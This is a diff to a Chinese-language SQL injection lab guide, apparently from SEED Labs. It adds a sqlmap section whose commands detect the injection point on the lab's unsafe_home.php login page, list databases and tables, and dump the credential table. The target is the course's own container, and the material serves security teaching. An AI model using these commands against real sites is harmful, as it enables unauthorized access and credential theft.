@@ -17,6 +17,7 @@
         ]       
 } 
 ```
+创建容器
 
 ```
 $ dcbuild
@@ -27,7 +28,7 @@ $ dcbuild
 容器创建成功后，才能启动容器
 
 ```
-$ dcbuild
+$ dcup
 ```
 
 **查看容器信息**
@@ -40,7 +41,7 @@ $ dockps
 4a101760d086  mysql-10.9.0.6
 ```
 
-## 1 任务1：熟悉MySQL语句
+## 1 任务1.1：熟悉MySQL语句
 
 本任务的目标是通过使用提供的数据库来熟悉SQL命令。web应用程序使用的数据存储在MySQL数据库中，该数据库托管在MySQL容器上。
 
@@ -72,6 +73,41 @@ mysql> show tables;
 ```
 
 运行上述命令后，需要使用SQL命令打印员工Alice的所有概要信息。请提供你的结果截图。
+
+## 1 任务1.2：sqlmap工具的使用
+
+sqlmap是一个使用python语言开发的开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件等。
+
+实验室环境中已经安装，如果自行安装，请用下面的命令安装
+
+```
+apt install sqlmap
+```
+
+安装好后，执行下面的命令可以帮助你了解 sqlmap 的相关命令
+
+```
+sqlmap -h  或者 sqlmap --h
+```
+
+下面是本次实验用到的sqlmap命令，通过这几条命令可以将我们搭建的web网站服务器的数据库和数据表信息找出来，并能够检测到web的注入点：
+
+```
+//检测某个url存在的漏洞，url必须得有接收参数的地方（例如：username=），否则的话就不存在漏洞。
+//可以看到很多提示信息，黄色[WARNING]表示不存在注入，加粗的绿色[INFO]信息大家关注是可能存在问题的点
+sqlmap -u "http://www.seed-server.com/unsafe_home.php?username=admin&Password=" 
+
+//读取某个url用到的数据库系统中存在的数据库名称
+sqlmap -u "http://www.seed-server.com/unsafe_home.php?username=admin&Password=" --DBS
+
+//读取某个数据库中的所有表
+sqlmap -u "http://www.seed-server.com/unsafe_home.php?username=admin&Password=" -D 数据库名 --tables
+
+//将某个表中的所有信息dump下来
+sqlmap -u "http://www.seed-server.com/unsafe_home.php?username=admin&Password=" -D 数据库名 -T 数据表名 --dump
+```
+
+运行上述命令后，可以将credential中的所有信息dump下来。请提供你的结果截图，并根据第一条命令找出可以注入的信息点。
 
 ## 2 任务2：Select语句下的注入攻击
 
